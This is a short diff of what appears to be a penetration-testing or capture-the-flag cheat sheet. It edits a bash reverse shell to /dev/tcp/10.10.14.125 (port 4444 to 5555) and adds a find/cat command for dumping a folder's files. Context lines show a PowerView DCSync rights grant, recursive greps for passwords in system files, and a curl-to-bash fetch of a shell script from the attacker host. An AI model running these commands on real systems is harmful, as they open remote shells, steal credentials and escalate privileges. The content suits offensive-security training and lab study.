@@ -207,6 +207,8 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null
   - grep --color=auto -rnw '/etc' -ie "Password" --color=always 2>/dev/null
   - find /etc -type f -exec grep -i -I "pass" {} /dev/null \;
+- Read all files in a folder
+  - find /path/target -type f -exec cat {} +
 
 - Virtual hosts?
 - lscpu
@@ -326,7 +328,7 @@ New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACK
 - Create a shell script that execute the desired command
 ```
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.14.125/4444 0>&1
+bash -i >& /dev/tcp/10.10.14.125/5555 0>&1
 ```
 - Upload the file to the target and execute it
   - curl 10.10.14.125:8888/shell.sh|bash (maybe encode)
